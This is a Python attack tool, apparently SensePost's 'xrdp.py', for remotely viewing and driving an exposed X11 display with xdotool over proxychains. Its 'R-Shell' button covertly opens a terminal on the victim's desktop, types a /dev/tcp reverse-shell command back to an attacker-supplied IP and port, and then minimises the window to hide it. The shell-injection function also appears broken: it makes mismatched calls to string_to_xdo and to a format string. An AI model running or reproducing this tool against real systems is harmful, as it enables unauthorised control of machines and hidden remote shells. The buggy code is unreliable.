#!/usr/bin/python
#
# xrdp.py - X11 Remote Desktop
# =====================================
#
# Authors:
# darryn@sensepost.com
# thomas@sensepost.com
#

import os
import sys
import subprocess
import time
import re
import gi
gi.require_version("Gtk", "3.0")
from gi.repository import Gtk
import cairo
import socket

cmd_prefix = "proxychains4 "

class xwin:
	host = ''
	xww = True
	keyspace = {' ':'space', '!':'exclam', '"':'quotedbl', '#':'numbersign', '$':'dollar', '%':'percent', '&':'ampersand', '\'':'quoteright', '(':'parenleft', ')':'parenright', '[':'bracketleft', '*':'asterisk', '\\':'backslash', '+':'plus', ']':'bracketright', ',':'comma', '^':'asciicircum', '-':'minus', '_':'underscore', '.':'period', '`':'quoteleft', '/':'slash', ':':'colon', ';':'semicolon', '<':'less', '=':'equal', '>':'greater', '?':'question', '@':'at', '{':'braceleft', '|':'bar', '}':'braceright', '~':'asciitilde'}
	spr_state = False
	ctrl_state = False
	alt_state = False

	def on_click(self, widget, event):
		cmd = 'export DISPLAY={} && {}xdotool mousemove {} {}'.format(self.host, cmd_prefix, event.x, event.y)
		if (event.button == 1):
			cmd += ' click 1'
		elif (event.button == 3):
			cmd += ' click 3'
		os.system(cmd)

	def string_to_xdo(self, st, entry):
		if (len(st) == 0):
			return 'Return'
		st = list(st)
		out = ''
		for ch in st:
			if ch in 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890':
				out += ch + ' '
			else:
				out += self.keyspace[ch] + ' '

		if ((len(out) > 2) and (self.spr_state or self.ctrl_state or self.alt_state)):
			entry.set_text('SUPER or CTRL or ALT are toggled. Only one character please.')
			return ''
		elif (self.spr_state and self.ctrl_state and self.alt_state):
			out = 'super+ctrl+alt+' + out
		elif (self.spr_state and self.ctrl_state):
			out = 'super+ctrl+' + out
		elif (self.spr_state and self.alt_state):
			out = 'super+alt+' + out
		elif (self.ctrl_state and self.alt_state):
			out = 'ctrl+alt+' + out
		elif (self.spr_state):
			out = 'super+' + out
		elif (self.ctrl_state):
			out = 'ctrl+' + out
		elif (self.alt_state):
			out = 'alt+' + out

		self.spr_state = False
		self.ctrl_state = False
		self.alt_state = False

		return out

	def on_shell_clicked(self, button, entry):
		entry_text = entry.get_text()
		entry.set_text("")
		if (len(entry_text) == 0):
			entry.set_text("IP:Port")
			return
		if ' ' in entry_text:
			dest = entry_text.split(' ')
		else:
			dest = entry_text.split(':')
		cmd = 'export DISPLAY={} && {}xdotool key ctrl+alt+t'.format(self.host, cmd_prefix)
		os.system(cmd)
		time.sleep(3)
		cmd = 'echo "exec 5<>/dev/tcp/{}/{} && cat <&5 | /bin/bash 2>&5 >&5" | /bin/bash'.format(dest[0], dest[1])
		cmd = 'export DISPLAY={} && {}xdotool key {}'.format(self.host, self.string_to_xdo(cmd, cmd_prefix, entry))
		os.system(cmd)
		time.sleep(5)
		cmd = 'export DISPLAY={} && {}xdotool key Return'.format(self.host, cmd_prefix)
		os.system(cmd)
		cmd = 'export DISPLAY={} && {}xdotool key ctrl+super+Down'.format(self.host, cmd_prefix)
		os.system(cmd)
		

	def on_backspace_clicked(self, button):
		cmd = 'export DISPLAY={} && {}xdotool key BackSpace'.format(self.host, cmd_prefix)
		os.system(cmd)

	def on_enter_clicked(self, button):
		cmd = 'export DISPLAY={} && {}xdotool key Return'.format(self.host, cmd_prefix)
		os.system(cmd)

	def on_button_toggled(self, button, name):
		if (button.get_active()):
			if (name == 'spr'):
				self.spr_state = True
			elif (name == 'ctrl'):
				self.ctrl_state = True
			elif (name == 'alt'):
				self.alt_state = True
		else:
			if (name == 'spr'):
				self.spr_state = False
			elif (name == 'ctrl'):
				self.ctrl_state = False
			elif (name == 'alt'):
				self.alt_state = False
	
	def enter_callback(self, widget, entry):
		entry_text = entry.get_text()
		entry.set_text("")
		cmd = 'export DISPLAY={} && {}xdotool key {}'.format(self.host, cmd_prefix, self.string_to_xdo(entry_text, entry))
		os.system(cmd)

	def expose(self, widget, event):
		self.cr = widget.window.cairo_create()
		self.cr.set_operator(cairo.OPERATOR_CLEAR)
		self.cr.rectangle(0.0, 0.0, *widget.get_size())
		self.cr.fill()

	def destroy(self, widget, data=None):
		if self.xww:
			os.system("kill {}".format(self.xww.pid + 1))
		Gtk.main_quit()

	def delete_event(self, widget, event, data=None):
		return False

	def draw(self, widget, context):
		context.set_source_rgba(0, 0, 0, 0)
		context.set_operator(cairo.OPERATOR_SOURCE)
		context.paint()
		context.set_operator(cairo.OPERATOR_OVER)

	def __init__(self, width, height):
		super().__init__()

		self.window = Gtk.Window() #Gtk.WINDOW_TOPLEVEL)
		self.window.connect("delete_event", self.delete_event)
		self.window.connect("destroy", self.destroy)
		self.window.connect('draw', self.draw)

		self.window.set_border_width(0)
		self.window.set_size_request(width, height + 30)
		self.window.set_app_paintable(True)

		self.screen = self.window.get_screen()


		visual = self.screen.get_rgba_visual()
		if visual and self.screen.is_composited():
			self.window.set_visual(visual)



		#self.rgba = self.screen.get_rgba_colormap()
		#self.window.set_colormap(self.rgba)
		#self.window.connect('expose-event', self.expose)

		self.vbox = Gtk.VBox(False, 5)
		self.hbox = Gtk.HBox(False, 3)
		self.bbox = Gtk.HBox(True, 3)

		self.entry = Gtk.Entry()
		self.entry.set_max_length(0)
		self.entry.set_size_request(int(width/2), 25)
		self.entry.connect("activate", self.enter_callback, self.entry)
		self.spr = Gtk.ToggleButton(label='spr')
		self.spr.connect("toggled", self.on_button_toggled, 'spr')
		self.ctrl = Gtk.ToggleButton(label='ctrl')
		self.ctrl.connect("toggled", self.on_button_toggled, 'ctrl')
		self.alt = Gtk.ToggleButton(label='alt')
		self.alt.connect("toggled", self.on_button_toggled, 'alt')
		self.enter = Gtk.Button(label='Enter')
		self.enter.connect("clicked", self.on_enter_clicked)
		self.backspace = Gtk.Button(label='Backspace')
		self.backspace.connect("clicked", self.on_backspace_clicked)
		self.shell = Gtk.Button(label='R-Shell')
		self.shell.connect("clicked", self.on_shell_clicked, self.entry)

		self.hbox.add(self.entry)
		self.bbox.add(self.spr)
		self.bbox.add(self.ctrl)
		self.bbox.add(self.alt)
		self.bbox.add(self.enter)
		self.bbox.add(self.backspace)
		self.bbox.add(self.shell)
		self.hbox.add(self.bbox)
		
		self.halign = Gtk.Alignment()
		self.halign.add(self.hbox)

		self.allalign = Gtk.Alignment()
		self.clickbox = Gtk.EventBox()
		self.clickbox.connect('button-press-event', self.on_click)
		self.clickbox.set_visible_window(False)

		self.allalign.add(self.clickbox)
		self.vbox.pack_start(self.allalign, True, True, 0)

		self.vbox.pack_end(self.halign, False, False, 0)

		self.window.add(self.vbox)

		self.window.show_all()

		self.window.move(100, 100)

	def main(self):
		Gtk.main()

def valid_ip(address):
    try: 
        socket.inet_aton(address)
        return True
    except:
        return False

def main():
	print ("""\
	              _       
	__  ___ __ __| |_ __  
	\ \/ / '__/ _` | '_ \ 
	 >  <| | | (_| | |_) |
	/_/\_\_|  \__,_| .__/ 
	               |_|    
		X11 Remote Desktop
	""")

	if (len(sys.argv) == 1):
		print("xrdp.py <host>:<dp>")
		print("------------------------")
		print("Example:")
		print("xrdp.py 10.0.0.10:0")
		print("xrdp.py 10.0.0.10:0 --no-disp")
		print("")
		quit()
	elif ((sys.argv[1] == "-h") or (sys.argv[1] == "--help")):
		print('''
xrdp.py - X11 Remote Desktop
=====================================

this is a rudimentary remote desktop tool for the X11 protocol

xrdp.py <host>:<dp>
--------------
 Example: xrdp.py 10.0.0.10:0
          xrdp.py 10.0.0.10:0 --no-disp

requirements:
--------------
 xwininfo
 xwatchwin
 xdotool

usage:
--------------
 --no-disp  = only load the keyboard input fields (do not render display)
 spr 		= toggle on/off + type character in entry + press enter to send
 ctrl 		= toggle on/off + type character in entry + press enter to send
 alt 		= toggle on/off + type character in entry + press enter to send
 Enter 		= press button to send enter key
 Backspace 	= press button to send backspace key
 R-Shell 	= type ip:port in entry + press button = automatically open terminal and run reverse shell then minimize window (ctrl+alt+t -> bashmagic -> ctrl+super+down)

Authors:
darryn@sensepost.com
thomas@sensepost.com
''')
		quit()

	disp = True

	try:
		inp1 = sys.argv[1]
		inp2 = sys.argv[2]

		if (inp1 == "--no-disp"):
			host = inp2
			disp = False
		elif (inp2 == "--no-disp"):
			host = inp1
			disp = False
	except IndexError:
		host = sys.argv[1]

	valid = re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{1,5}$", host)
	if valid:
		if not valid_ip(host.split(':')[0]):
			print('Invalid IP address.')
			quit()
		if (int(host.split(':')[1]) > 65535):
			print('Invalid diplay number.')
			quit()
	else:
		print('Invalid input.')
		quit()

	try:
		xwininfo = "{}xwininfo -root -display {}".format(cmd_prefix, host)
		dpinfo = subprocess.check_output(xwininfo, shell=True, stdin=subprocess.PIPE, stderr=subprocess.STDOUT).decode('ASCII')
		winid = re.search('Window id: 0x[0-9a-fA-F]+', dpinfo)
		winid = winid.group(0).split(' ')
		winid = winid[2]

		winwidth = re.search('Width: [0-9]+', dpinfo)
		winwidth = winwidth.group(0).split(' ')
		winwidth = int(winwidth[1])

		winheight = re.search('Height: [0-9]+', dpinfo)
		winheight = winheight.group(0).split(' ')
		winheight = int(winheight[1])

		if disp:
			xwatchwin = "{}xwatchwin {} -w {} > /dev/null".format(cmd_prefix, host, winid)
			xww = subprocess.Popen(xwatchwin, shell=True)
			time.sleep(2)

			xwinmove = "{}xdotool getactivewindow windowmove 100 100".format(cmd_prefix)
			os.system(xwinmove)

			overlay = xwin(winwidth, winheight)
			overlay.host = host
			overlay.xww = xww
			overlay.main()
		else:
			overlay = xwin(480, 1)
			overlay.host = host
			overlay.xww = False
			overlay.main()
	except KeyboardInterrupt:
		quit()


if __name__ == '__main__':
	main()
